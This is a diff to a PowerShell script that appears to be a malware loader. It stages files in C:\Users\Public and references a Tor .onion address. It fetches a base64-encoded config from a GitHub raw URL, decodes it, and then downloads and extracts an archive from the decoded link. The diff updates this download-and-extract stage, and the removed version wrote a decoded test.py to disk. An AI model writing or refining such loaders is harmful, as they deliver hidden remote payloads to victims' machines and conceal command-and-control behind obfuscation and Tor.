@@ -1,8 +1,8 @@
-## VERSION 1.2.4
+## VERSION 1.3
 
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
-$extract = "C:\Users\Public\extract\"
+$extract = "C:\Users\Public\Extract"
 $url = "http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion"
 $orConfigPath = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/config" | Select-Object -ExpandProperty Content
 $deConfigPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orConfigPath))
@@ -15,26 +15,28 @@ $testFilePath = "$extract\test.py"
 
 # Downloads from GitHub
 function download {
-    # Download T
     if (Test-Path $extract) {
         "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
     } else {
-        "Downloading zip..." | Out-File -FilePath $log
+        "DEBUG : $oLink" | Out-File -Append -FilePath $log
+        "Downloading tar.gz..." | Out-File -Append -FilePath $log
+        
         Invoke-WebRequest -Uri $oLink -OutFile $zip
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $extract)
-        "Cleaning zip" | Out-File -FilePath $log
-        Remove-Item $zip
-    }
 
-    # Download test.py
-    if (Test-Path $testFilePath) {
-        "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
-    } else {
-        "Downloading test.py..." | Out-File -FilePath $log
-        $deTestLink | Out-File -FilePath $testFilePath -Encoding utf8
+        if (Test-Path $zip) {
+            if (-not (Test-Path $extract)) {
+                New-Item -ItemType Directory -Path $extract | Out-Null
+            }
+
+            tar -xf $zip -C $extract
+            "Cleaning archive" | Out-File -FilePath $log -Append
+            Remove-Item $zip
+        } else {
+            "Failed to download archive." | Out-File -FilePath $log -Append
+        }
     }
 }
+
 
 # Sets port in config file
 function writeConfig {
